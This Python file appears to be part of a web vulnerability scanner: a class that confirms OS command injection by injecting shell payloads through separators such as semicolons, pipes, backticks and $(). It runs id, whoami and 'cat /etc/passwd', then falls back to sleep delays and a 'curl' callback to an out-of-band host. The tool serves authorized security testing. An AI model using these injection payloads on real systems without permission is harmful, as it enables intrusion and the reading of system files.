#!/usr/bin/env python3
"""
RCE Verifier
============
Multi-stage with arithmetic proof:

  Stage 1: Arithmetic proof ($((N1*N2)))
  Stage 2: OS command output (id/whoami/uname)
  Stage 3: Time-based blind (sleep)
  Stage 4: OAST-based confirmation (out-of-band)
"""
import re
import time
import random

from ..base_verifier import BaseVerifier
from ..models import VerifiedFinding, VerificationEvidence


class RCEVerifier(BaseVerifier):
    VULN_TYPE = "RCE"
    VULN_TITLE = "OS Command Injection"
    DEFAULT_SEVERITY = "critical"
    DEFAULT_CWE = "CWE-78"
    DEFAULT_CVSS = 9.8
    DEFAULT_CVSS_VECTOR = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    DEFAULT_REMEDIATION = (
        "Never pass user input to shell commands. Use library APIs "
        "(e.g., Python subprocess with shell=False, execve). "
        "Validate input against strict allowlists. Apply least-privilege "
        "for the application process."
    )

    SEPARATORS = [
        (";", "semicolon"),
        ("|", "pipe"),
        ("||", "OR"),
        ("&&", "AND"),
        ("`", "backtick"),
        ("$(", "dollar-paren"),
        ("%0a", "newline"),
        ("%0d%0a", "CRLF"),
        ("\n", "raw-newline"),
    ]

    OS_COMMANDS = [
        ("id", [(r"uid=(\d+)\(([^)]+)\)\s+gid=(\d+)\(([^)]+)\)",
                "Linux id output")]),
        ("whoami", [(r"^(root|www-data|apache|nginx|nobody|httpd|tomcat|admin)$",
                    "Current user")]),
        ("uname -a", [(r"(Linux|Darwin|FreeBSD)\s+\S+\s+\d+\.\d+\.\d+",
                      "Kernel version")]),
        ("hostname", [(r"^[a-zA-Z0-9][a-zA-Z0-9\-\.]{1,60}$", "Hostname")]),
        ("cat /etc/passwd", [(r"root:[x*]?:\d+:\d+:", "Root entry")]),
        ("ipconfig", [(r"Windows IP Configuration", "Windows ipconfig")]),
    ]

    def __init__(self, http_client, config=None):
        super().__init__(http_client, config)
        self.oast = (config or {}).get("_oast")

    def verify(self, url, param, method="GET", form_data=None):
        self.steps = []

        # ── Stage 1: Arithmetic proof ────────────────────────────────────
        arith_step = self.start_step(
            "arithmetic_proof",
            "Using $(()) arithmetic to prove command execution",
            stage="detection",
        )
        n1 = random.randint(1000, 9999)
        n2 = random.randint(1000, 9999)
        expected = str(n1 * n2)

        for sep, sep_name in self.SEPARATORS:
            if sep == "$(":
                payload = f"$(({n1}*{n2}))"
            elif sep == "`":
                payload = f"`expr {n1} '*' {n2}`"
            else:
                payload = f"1{sep}echo $(({n1}*{n2}))"

            ex = self.inject(url, param, payload, method, form_data)
            if not ex or ex.response_status == 0:
                continue

            if expected in (ex.response_body or ""):
                ev = VerificationEvidence(
                    type="arithmetic_proof",
                    title=f"Arithmetic proof via '{sep_name}' separator",
                    description=(
                        f"Computed {n1} * {n2} = {expected} inside the "
                        f"response. This proves OS command execution — "
                        f"the shell evaluated the arithmetic expression."
                    ),
                    payload=payload,
                    extracted_data={
                        "operator": n1, "operand": n2,
                        "result": expected, "separator": sep_name,
                    },
                    exchange=ex,
                    confidence=0.98,
                )
                self.finish_step(
                    arith_step, "passed",
                    payload=payload,
                    details=f"Confirmed via '{sep_name}'",
                    evidence=[ev],
                )

                # ── Stage 2: OS command output ──────────────────────────
                cmd_step = self.start_step(
                    "os_command_output",
                    "Executing OS commands and capturing output",
                    stage="extraction",
                )
                extracted = {}
                cmd_evidence = []
                for cmd, patterns in self.OS_COMMANDS:
                    cmd_payload = f"1{sep}{cmd}"
                    ex2 = self.inject(url, param, cmd_payload,
                                     method, form_data)
                    if not ex2 or ex2.response_status == 0:
                        continue
                    for pattern, desc in patterns:
                        m = re.search(pattern, ex2.response_body or "",
                                     re.M | re.I)
                        if m:
                            match_value = m.group(0)[:300]
                            extracted[cmd] = match_value
                            cmd_evidence.append(VerificationEvidence(
                                type="command_output",
                                title=f"OS command output: {cmd}",
                                description=desc,
                                payload=cmd_payload,
                                extracted_data={cmd: match_value},
                                exchange=ex2,
                                confidence=0.98,
                            ))
                            break

                if extracted:
                    self.finish_step(
                        cmd_step, "passed",
                        details=f"Extracted: {list(extracted.keys())}",
                        evidence=cmd_evidence,
                    )
                else:
                    self.finish_step(
                        cmd_step, "failed",
                        details="Arithmetic worked but OS commands blocked",
                    )

                return self.build_finding(
                    url=url, param=param,
                    confidence=0.98,
                    description=(
                        f"OS Command Injection confirmed via "
                        f"'{sep_name}' separator. "
                        + (f"Extracted: {extracted}" if extracted else "")
                    ),
                    methods=(["arithmetic_proof"] +
                            (["os_command_output"] if extracted else [])),
                    extracted_info=extracted,
                    key_exchange=ex,
                )

        self.finish_step(arith_step, "failed",
                        details="Arithmetic result not found in response")

        # ── Stage 3: Time-based blind ────────────────────────────────────
        time_step = self.start_step(
            "time_based_blind",
            "Testing with sleep commands",
            stage="detection",
        )
        delay = 5
        for sep, sep_name in self.SEPARATORS[:5]:
            if sep == "$(":
                payload = f"$(sleep {delay})"
            elif sep == "`":
                payload = f"`sleep {delay}`"
            else:
                payload = f"1{sep}sleep {delay}"

            base = self.inject(url, param, "1", method, form_data)
            if not base:
                continue
            baseline = base.response_time_ms

            ex = self.inject(url, param, payload, method, form_data)
            if not ex:
                continue
            elapsed = ex.response_time_ms

            if (elapsed > baseline + 4000 and
                elapsed > delay * 1000 * 0.7):
                ev = VerificationEvidence(
                    type="timing_delay",
                    title=f"Time delay confirmed ({sep_name})",
                    description=(
                        f"Response delayed by {elapsed - baseline:.0f}ms "
                        f"vs baseline, matching {delay}s sleep."
                    ),
                    payload=payload,
                    extracted_data={
                        "baseline_ms": round(baseline, 2),
                        "elapsed_ms": round(elapsed, 2),
                        "delay_seconds": delay,
                    },
                    exchange=ex,
                    confidence=0.85,
                )
                self.finish_step(
                    time_step, "passed",
                    payload=payload,
                    details=f"Delay: {elapsed - baseline:.0f}ms",
                    evidence=[ev],
                )
                return self.build_finding(
                    url=url, param=param,
                    confidence=0.85,
                    description=(
                        f"Blind RCE confirmed via time delay ({sep_name})"
                    ),
                    methods=["time_based_blind"],
                    extracted_info={
                        "baseline_ms": round(baseline, 2),
                        "elapsed_ms": round(elapsed, 2),
                    },
                    key_exchange=ex,
                )

        self.finish_step(time_step, "failed",
                        details="No timing delay detected")

        # ── Stage 4: OAST callback ───────────────────────────────────────
        if self.oast:
            oast_step = self.start_step(
                "oast_callback",
                "Testing via out-of-band DNS/HTTP callback",
                stage="detection",
            )
            try:
                token = self.oast.generate_token()
                oast_url = self.oast.get_url(token)
                for sep, sep_name in self.SEPARATORS[:4]:
                    if sep == "$(":
                        payload = f"$(curl {oast_url})"
                    elif sep == "`":
                        payload = f"`curl {oast_url}`"
                    else:
                        payload = f"1{sep}curl {oast_url}"

                    ex = self.inject(url, param, payload, method, form_data)
                    interactions = self.oast.poll(token, timeout=8)
                    if interactions:
                        ev = VerificationEvidence(
                            type="oast_callback",
                            title="OAST callback received",
                            description=(
                                f"Target server made an out-of-band request "
                                f"from {interactions[0].get('source_ip')}"
                            ),
                            payload=payload,
                            extracted_data={
                                "source_ip": interactions[0].get('source_ip'),
                                "user_agent": interactions[0].get('user_agent', ''),
                            },
                            exchange=ex,
                            confidence=0.98,
                        )
                        self.finish_step(
                            oast_step, "passed",
                            payload=payload,
                            details=f"Callback from "
                                   f"{interactions[0].get('source_ip')}",
                            evidence=[ev],
                        )
                        return self.build_finding(
                            url=url, param=param,
                            confidence=0.98,
                            description="Blind RCE confirmed via OAST callback",
                            methods=["oast_callback"],
                            extracted_info={
                                "source_ip": interactions[0].get('source_ip'),
                            },
                            key_exchange=ex,
                        )
                self.finish_step(oast_step, "failed",
                                details="No OAST callback received")
            except Exception as e:
                self.finish_step(oast_step, "error", details=str(e))

        return None